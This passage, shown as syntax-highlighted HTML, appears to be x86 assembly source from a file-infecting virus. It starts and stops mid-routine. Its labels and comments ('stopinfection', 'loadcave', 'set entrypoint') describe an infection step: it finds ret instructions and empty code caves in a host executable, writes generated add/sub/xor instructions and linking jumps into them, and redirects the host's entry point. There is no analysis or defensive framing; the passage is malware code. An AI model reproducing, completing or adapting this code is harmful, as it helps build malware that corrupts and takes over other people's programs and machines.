</span><span class="sc5">bottomoffset</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">upperoffset</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">savecount</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">bottomoffset</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; for linking</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">upperoffset</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">doomconstate</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">dispval</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; load code value</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111111b</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">getagetagain</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0C3h</span><span class="sc0">         </span><span class="sc1">; search for a ret inside the </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getagetagain5</span><span class="sc0">               </span><span class="sc1">; code</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; it will be dead point</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">getagainfinish</span><span class="sc0">

</span><span class="sc5">getagetagain5</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getagetagain</span><span class="sc0">

</span><span class="sc5">getagainfinish</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Offset2RVA</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">connectval</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; set it to connect value</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">loaddropplace</span><span class="sc0">               </span><span class="sc1">; search for a jump</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">stopinfection</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">makeaconnectjmp</span><span class="sc0">             </span><span class="sc1">; place jump to there</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">11b</span><span class="sc0">                 </span><span class="sc1">; une valse  3 temps</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nonoprob11</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">nonoprob11</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">weneedtogetit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">savecount</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">loaddropplace</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">savecount</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">stopinfection</span><span class="sc0">

</span><span class="sc1">; au premier temps de la valse</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">081h</span><span class="sc0">         </span><span class="sc1">; set an instruction </span><span class="sc0">
                        </span><span class="sc1">; playing on stack</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gotoneinst1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">dispval</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">gotoneinst1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gotoneinst2</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">02Ch</span><span class="sc0">               </span><span class="sc1">; add </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">dispval</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">gotoneinst2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gotoneinst3</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">034h</span><span class="sc0">               </span><span class="sc1">; sub</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">dispval</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">gotoneinst3</span><span class="sc4">:</span><span class="sc0">
    
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">24h</span><span class="sc0">                </span><span class="sc1">; xor</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">makeaconnectjmp</span><span class="sc0">                 </span><span class="sc1">; then connect a jmp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">connectval</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">savecount</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">weneedtogetit</span><span class="sc0">                   </span><span class="sc1">; x times done ?</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">loaddropplace</span><span class="sc0">                   </span><span class="sc1">; search for a push</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">stopinfection</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">doomconstate</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">        

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">dispval</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">6860h</span><span class="sc0">                </span><span class="sc1">; pushad push</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">makeaconnectjmp</span><span class="sc0">                 </span><span class="sc1">; jmp to</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">doomconstate</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">; set entrypoint</span><span class="sc0">

</span><span class="sc5">stopinfection5</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; of this little</span><span class="sc0">
                            </span><span class="sc1">; messing code</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">stopinfection</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">20</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">stopinfection5</span><span class="sc0">

</span><span class="sc1">; blop blop blop - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><span class="sc0">

</span><span class="sc5">loaddropplace</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">loadcave</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">; no cave ?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">returnme</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">upperoffset</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; check for init</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">setitright</span><span class="sc0">                  </span><span class="sc1">; upper offset</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">upperoffset</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; ok</span><span class="sc0">

</span><span class="sc5">setitright</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">doomconstate</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">getthatmoo</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">bottomoffset</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; no bottom offset?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">setitright0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">bottomoffset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">upperoffset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">caca1</span><span class="sc0">                   </span><span class="sc1">; no collision betwenn bot</span><span class="sc0">
                        </span><span class="sc1">; and upper offset</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">bottomoffset</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gotonextone1</span><span class="sc0">

</span><span class="sc5">setitright0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">upperoffset</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">caca2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; calculate dead space</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">caca2</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">gotonextone</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">bottomoffset</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">bottomoffset</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; load next bottom</span><span class="sc0">
</span><span class="sc5">gotonextone1</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; offset</span><span class="sc0">
